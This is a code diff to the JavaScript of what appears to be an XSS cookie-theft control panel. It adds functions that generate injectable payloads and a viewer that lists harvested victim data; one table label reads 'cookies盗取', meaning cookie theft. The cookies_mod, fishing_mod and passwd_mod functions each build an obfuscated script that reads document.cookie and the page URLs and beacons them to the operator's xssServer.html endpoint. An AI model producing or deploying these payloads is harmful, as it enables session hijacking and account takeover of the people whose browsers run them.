@@ -1,6 +1,7 @@
 $("#fishing").attr("class", "active");
 $("#xss").attr("class", "active");
 
+
 function getLocalTime(nS) {
     var date = new Date(nS);
     Y = date.getFullYear() + '-';
@@ -14,7 +15,7 @@ function getLocalTime(nS) {
 
 function del(id) {
     $.ajax({
-        url: 'delWeb.html',
+        url: 'delXss.html',
         dataType: 'json',
         data: {
             id: id
@@ -25,22 +26,41 @@ function del(id) {
     });
 }
 
+function config(id) {
+    $('#xssConfigInfos').empty();
+    var path = $("#urlPath").val();
+    var uid = $("#user_id").val();
+    var code = cookies_mod(path, id, uid);
+    console.log(code);
+    $('#xssConfigInfos').append(code);
+    $('#xssConfigInfo').modal();
+}
+
 function see(id) {
     $.ajax({
-        url: 'findWeb.html',
+        url: 'findXssInfo.html',
         dataType: 'json',
         data: {
             id: id
         },
         success: function(data) {
-            var d = data.model.result[0];
-            var urls = d.url_path.split(",");
+            console.log(data);
+            var d = data.model.result;
             var _h = '';
-            for (var i = 0; i < urls.length; i++) {
-                _h += '<p><a href="' + urls[i] + '">' + urls[i] + '</a></p>';
+            for (var i = 0; i < d.length; i++) {
+                var id = d[i].id;
+                var create_time = getLocalTime(d[i].create_time);
+                var info = d[i].list.split("|&|");
+                _h += '<p><span style="font-weight: bold;">id : </span>' + id + '</p>';
+                _h += '<p><span style="font-weight: bold;">time : </span>' + create_time + '</p>';
+                _h += '<p><span style="font-weight: bold;">location :</span> ' + info[0] + '</p>';
+                _h += '<p><span style="font-weight: bold;">toplocation :</span> ' + info[1] + '</p>';
+                _h += '<p><span style="font-weight: bold;">cookie : </span>' + info[2] + '</p>';
+                _h += '<p><span style="font-weight: bold;">opener : </span>' + info[3] + '</p>';
+                _h += '<p><hr style="border: 1px solid #CCCCCC;"></p>';
             };
-            $('#urlPaths').html(_h);
-            $('#urlPath_list').modal();
+            $('#xssInfo_lists').html(_h);
+            $('#xssInfo_list').modal();
         }
     });
 }
@@ -49,13 +69,18 @@ $("#addXss").click(function() {
     $('#modal_id').modal();
 });
 
-$("#startWeb").click(function() {
-    var url = $("#webUrl").val();
+$("#addXsss").click(function() {
+    var xssTitle = $("#xssTitle").val();
+    var xssDesc = $("#xssDesc").val();
+    var types = $("input[name='types']:checked").val();
     $.ajax({
-        url: 'addWeb.html',
+        url: 'addXss.html',
+        type:'post',
         dataType: 'json',
         data: {
-            url: url
+            xssTitle: xssTitle,
+            xssDesc: xssDesc,
+            types: types
         },
         success: function(data) {
             console.log(data);
@@ -83,11 +108,29 @@ function html(id, title, detail, num, type, create_time) {
     _h += '<td style="text-align: center;">' + id + '</td>';
     _h += '<td style="text-align: center;">' + title + '</td>';
     _h += '<td style="text-align: center;">' + detail + '</td>';
+    if(type=="1"){
+        _h += '<td style="text-align: center;">cookies盗取</td>';
+    }
+
     _h += '<td style="text-align: center;">' + num + '</td>';
-    _h += '<td style="text-align: center;">' + type + '</td>';
     _h += '<td style="text-align: center;"><span style="cursor: pointer;color: #3C8DBC; font-weight: bold;" onclick="see(' + id + ')">点击查看</span></td>';
     _h += '<td style="text-align: center;">' + create_time + '</td>';
-    _h += '<td style="text-align: center;"><span class="label label-warning" style=" cursor: pointer;" onclick="del(' + id + ')">config</span>&nbsp;&nbsp;<span class="label label-danger" style=" cursor: pointer;" onclick="del(' + id + ')">delete</span></td>';
+    _h += '<td style="text-align: center;"><span class="label label-warning" style=" cursor: pointer;" onclick="config(' + id + ')">config</span>&nbsp;&nbsp;<span class="label label-danger" style=" cursor: pointer;" onclick="del(' + id + ')">delete</span></td>';
     _h += '</tr>';
     return _h;
+}
+
+function cookies_mod(path, id, uid) {
+    var _js = '(function(){var f=new Image,a=escape,b;try{b=document.location.href}catch(e){b=""}a="' + path + 'fishing/xssServer.html?id=' + id + '&uid=' + uid + '&type=1&location="+a(b)+"&toplocation="+escape(void 0)+"&cookie=";b=escape;var c;try{c=document.cookie}catch(e){c=""}c=a+b(c)+"&opener=";var a=escape,d;try{d=window.opener&&window.opener.location.href?window.opener.location.href:""}catch(e){d=""}f.src=c+a(d)})();';
+    return _js;
+}
+
+function fishing_mod(path) {
+    var _js = '(function(){var f=new Image,a=escape,b;try{b=document.location.href}catch(e){b=""}a="' + path + 'fishing/xssServer.html?id=1&type=1&location="+a(b)+"&toplocation="+escape(void 0)+"&cookie=";b=escape;var c;try{c=document.cookie}catch(e){c=""}c=a+b(c)+"&opener=";var a=escape,d;try{d=window.opener&&window.opener.location.href?window.opener.location.href:""}catch(e){d=""}f.src=c+a(d)})();';
+    return _js;
+}
+
+function passwd_mod(path) {
+    var _js = '(function(){var f=new Image,a=escape,b;try{b=document.location.href}catch(e){b=""}a="' + path + 'fishing/xssServer.html?id=1&type=1&location="+a(b)+"&toplocation="+escape(void 0)+"&cookie=";b=escape;var c;try{c=document.cookie}catch(e){c=""}c=a+b(c)+"&opener=";var a=escape,d;try{d=window.opener&&window.opener.location.href?window.opener.location.href:""}catch(e){d=""}f.src=c+a(d)})();';
+    return _js;
 }
